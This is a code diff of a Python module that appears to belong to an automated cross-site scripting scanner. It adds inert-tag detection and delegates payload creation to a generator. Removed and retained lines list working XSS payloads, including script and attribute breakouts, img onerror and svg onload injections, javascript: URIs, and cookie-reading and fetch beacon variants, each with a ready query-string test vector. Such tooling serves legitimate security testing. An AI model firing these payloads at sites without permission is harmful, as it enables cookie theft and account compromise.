@@ -94,6 +94,13 @@ _PROBE_CLOSE = "AXSSCL"
 # ---------------------------------------------------------------------------
 
 
+# Tags whose content is never executable — reflections inside these are inert.
+# XSStrike calls these "bad tags"; we skip them rather than generating payloads.
+_INERT_TAGS: tuple[str, ...] = (
+    "style", "template", "textarea", "title", "noembed", "noscript",
+)
+
+
 @dataclass(slots=True)
 class ReflectionContext:
     """A single location where a probed parameter was reflected."""
@@ -111,6 +118,11 @@ class ReflectionContext:
 
     snippet: str = ""
     """Short excerpt of surrounding HTML for reference."""
+
+    context_before: str = ""
+    """For js_string_* and js_code contexts: the script block content that
+    appears before the injection point.  Fed to js_contexter to build the
+    dynamic break-out closer string.  Empty for all other context types."""
 
     @property
     def is_exploitable(self) -> bool:
@@ -194,12 +206,42 @@ def _make_canary() -> str:
     return "axss" + secrets.token_hex(4)
 
 
+def _inside_inert_tag(before: str) -> bool:
+    """Return True if *before* ends inside a non-executable tag's content.
+
+    Tags like <textarea>, <style>, <title>, <noscript> render content as
+    text — injected HTML/JS inside them cannot execute.  We detect them the
+    same way we detect <script>: find the last unclosed opener.
+    """
+    for tag in _INERT_TAGS:
+        open_pos = before.rfind(f"<{tag}")
+        if open_pos == -1:
+            continue
+        # Confirm it's actually <tagname (not e.g. <textarea-custom>)
+        after_name = before[open_pos + 1 + len(tag) : open_pos + 2 + len(tag)]
+        if after_name and after_name not in (" ", ">", "/", "\t", "\n", "\r"):
+            continue
+        close_pos = before.rfind(f"</{tag}")
+        if close_pos == -1 or close_pos < open_pos:
+            return True
+    return False
+
+
 def _classify_context_at(html: str, idx: int, canary: str) -> ReflectionContext | None:
-    """Determine the XSS injection context at *idx* in *html*."""
+    """Determine the XSS injection context at *idx* in *html*.
+
+    Returns None when the reflection is inside a non-executable tag
+    (textarea, style, title, noscript, noembed) — no payload can execute there.
+    """
     snippet_start = max(0, idx - 300)
     snippet_end = min(len(html), idx + len(canary) + 100)
     snippet = html[snippet_start:snippet_end]
     before = html[:idx]
+
+    # 0. Inert tag check — must come first so we don't misclassify these as
+    #    html_body.  A reflection inside <textarea> is not exploitable.
+    if _inside_inert_tag(before):
+        return None
 
     # 1. HTML comment?
     copen = before.rfind("<!--")
@@ -232,8 +274,16 @@ def _classify_context_at(html: str, idx: int, canary: str) -> ReflectionContext 
                     count += 1
                 i += 1
             if count % 2 == 1:
-                return ReflectionContext(context_type=ctx_type, snippet=snippet)
-        return ReflectionContext(context_type="js_code", snippet=snippet)
+                return ReflectionContext(
+                    context_type=ctx_type,
+                    snippet=snippet,
+                    context_before=content_before,
+                )
+        return ReflectionContext(
+            context_type="js_code",
+            snippet=snippet,
+            context_before=content_before,
+        )
 
     # 3. Inside an HTML attribute?
     last_tag_open = before.rfind("<")
@@ -248,7 +298,8 @@ def _classify_context_at(html: str, idx: int, canary: str) -> ReflectionContext 
                     context_type="html_attr_event", attr_name=attr_name, snippet=snippet
                 )
             if attr_name in (
-                "href", "src", "action", "formaction", "data", "xlink:href", "content",
+                "href", "src", "action", "formaction", "data",
+                "xlink:href", "content", "srcdoc",
             ):
                 return ReflectionContext(
                     context_type="html_attr_url", attr_name=attr_name, snippet=snippet
@@ -301,107 +352,67 @@ def _analyze_char_survival(html: str, canary: str) -> frozenset[str]:
 
 
 def payloads_for_probe_result(result: ProbeResult) -> list[PayloadCandidate]:
-    """Generate targeted, directly-usable payloads for a confirmed probe reflection.
+    """Generate targeted payloads for a confirmed probe reflection.
 
-    Unlike the heuristic generator in payloads.py, these are unencoded and
-    tied to the exact parameter and context observed during active probing.
-    The ``test_vector`` field shows the exact ``?param=value`` to use.
+    Delegates to the combinatorial generator in ``active/generator.py`` for
+    all context types so payloads are synthesised from the actual surviving
+    character set and (for JS contexts) the dynamic break-out closer built
+    by jsContexter.
+
+    Falls back to a small set of static payloads for json_value and any
+    context types not yet handled by the generator.
     """
+    from ai_xss_generator.active import generator as gen
+
     payloads: list[PayloadCandidate] = []
 
     for ctx in result.reflections:
         sc = ctx.surviving_chars
         ct = ctx.context_type
+        pn = result.param_name
 
-        def _p(raw: str, title: str, risk: int = 90) -> PayloadCandidate:
-            return PayloadCandidate(
-                payload=raw,
-                title=f"{title} [{result.param_name}]",
-                explanation=(
-                    f"Active probe confirmed: '{result.param_name}' → {ctx.short_label}. "
-                    + (f"Surviving chars: {''.join(sorted(sc))!r}." if sc else "")
-                ),
-                test_vector=f"?{result.param_name}={url_quote(raw, safe='')}",
-                tags=["probe-confirmed", ct, f"param:{result.param_name}"],
-                target_sink=f"probe:{ct}",
-                risk_score=risk,
-            )
-
-        if ct == "js_string_dq" and ('"' in sc or ";" in sc):
-            payloads += [
-                _p('";alert(document.domain)//', "Double-quote JS breakout → domain alert", 96),
-                _p('";alert(document.cookie)//', "Double-quote JS breakout → cookie exfil", 94),
-                _p('"+alert(document.domain)+"', "Double-quote in-string concat", 88),
-                _p('";fetch("//"+document.domain)//', "Double-quote → OOB beacon", 87),
-            ]
-
-        elif ct == "js_string_sq" and ("'" in sc or ";" in sc):
-            payloads += [
-                _p("';alert(document.domain)//", "Single-quote JS breakout → domain alert", 96),
-                _p("';alert(document.cookie)//", "Single-quote JS breakout → cookie exfil", 94),
-            ]
-
-        elif ct == "js_string_bt" and ("`" in sc or ";" in sc):
-            payloads += [
-                _p("`; alert(document.domain)//", "Backtick JS breakout → alert", 90),
-                _p("`${alert(document.domain)}`", "Backtick template expression", 88),
-            ]
-
-        elif ct == "js_code":
-            payloads += [
-                _p("alert(document.domain)//", "Direct JS code injection", 97),
-                _p(";alert(document.cookie)//", "Semicolon-prefixed JS injection", 94),
-                _p("(function(){alert(document.domain)})()", "IIFE injection", 90),
-            ]
-
-        elif ct == "html_attr_event":
-            payloads += [
-                _p("alert(document.domain)", "Direct event handler payload", 99),
-                _p("alert(document.cookie)", "Event handler → cookie exfil", 97),
-                _p("fetch('//'+document.domain)", "Event handler → OOB beacon", 91),
-            ]
-
-        elif ct == "html_attr_url":
-            payloads += [
-                _p("javascript:alert(document.domain)", "JavaScript URI injection", 96),
-                _p("javascript:alert(document.cookie)", "JavaScript URI → cookie exfil", 94),
-                _p("data:text/html,<script>alert(document.domain)</script>", "Data URI HTML embed", 89),
-            ]
-
-        elif ct == "html_attr_value":
-            if '"' in sc:
-                payloads += [
-                    _p('" onmouseover="alert(document.domain)', 'Attr escape (") → onmouseover', 94),
-                    _p('" onfocus="alert(document.domain)" autofocus="', 'Attr escape (") → autofocus', 92),
-                ]
-            if "'" in sc:
-                payloads.append(
-                    _p("' onmouseover='alert(document.domain)", "Attr escape (') → onmouseover", 94)
-                )
-
-        elif ct == "html_body" and "<" in sc:
-            payloads += [
-                _p("<img src=x onerror=alert(document.domain)>", "HTML injection → img onerror", 96),
-                _p("<svg onload=alert(document.domain)>", "HTML injection → SVG onload", 94),
-                _p("<details open ontoggle=alert(document.domain)>", "HTML injection → details ontoggle", 89),
-                _p("<script>alert(document.domain)</script>", "HTML injection → script tag", 91),
-            ]
+        if ct == "html_body":
+            payloads += gen.html_body_payloads(sc, pn)
 
         elif ct == "html_comment":
-            if "-" in sc:
-                payloads.append(
-                    _p("--><img src=x onerror=alert(document.domain)><!--", "Comment breakout → onerror", 91)
-                )
-            if "<" in sc and "-" not in sc:
-                payloads.append(
-                    _p("<img src=x onerror=alert(document.domain)>", "Comment → HTML injection", 88)
-                )
+            payloads += gen.html_comment_payloads(sc, pn)
+
+        elif ct == "js_string_dq" and ('"' in sc or ";" in sc):
+            payloads += gen.js_string_payloads(sc, pn, '"', ctx.context_before, ct)
+
+        elif ct == "js_string_sq" and ("'" in sc or ";" in sc):
+            payloads += gen.js_string_payloads(sc, pn, "'", ctx.context_before, ct)
+
+        elif ct == "js_string_bt" and ("`" in sc or ";" in sc):
+            payloads += gen.js_string_payloads(sc, pn, "`", ctx.context_before, ct)
+
+        elif ct == "js_code":
+            payloads += gen.js_code_payloads(sc, pn, ctx.context_before)
+
+        elif ct == "html_attr_event":
+            payloads += gen.html_attr_event_payloads(sc, pn, ctx.attr_name)
+
+        elif ct == "html_attr_url":
+            payloads += gen.html_attr_url_payloads(sc, pn, ctx.attr_name)
+
+        elif ct == "html_attr_value":
+            payloads += gen.html_attr_value_payloads(sc, pn, ctx.attr_name)
 
         elif ct == "json_value" and '"' in sc:
-            payloads += [
-                _p('</script><script>alert(document.domain)</script>', "JSON → script injection", 89),
-                _p('","xss":"<img src=x onerror=alert(1)>', "JSON structure break → HTML", 86),
-            ]
+            # json_value is niche enough that static payloads are fine
+            for raw, title, risk in [
+                ('</script><script>alert(document.domain)</script>', "JSON → script injection", 89),
+                ('","xss":"<img src=x onerror=alert(1)>', "JSON structure break → HTML", 86),
+            ]:
+                payloads.append(PayloadCandidate(
+                    payload=raw,
+                    title=f"{title} [{pn}]",
+                    explanation=f"Active probe confirmed json_value for '{pn}'.",
+                    test_vector=f"?{pn}={url_quote(raw, safe='')}",
+                    tags=["probe-confirmed", ct, f"param:{pn}"],
+                    target_sink=f"probe:{ct}",
+                    risk_score=risk,
+                ))
 
     return payloads
 
@@ -509,6 +520,7 @@ def _probe_param(
                 attr_name=ctx.attr_name,
                 surviving_chars=surviving,
                 snippet=ctx.snippet,
+                context_before=ctx.context_before,
             )
             for ctx in reflections
         ],
@@ -575,6 +587,7 @@ def _probe_param_playwright(
                 attr_name=ctx.attr_name,
                 surviving_chars=surviving,
                 snippet=ctx.snippet,
+                context_before=ctx.context_before,
             )
             for ctx in reflections
         ],
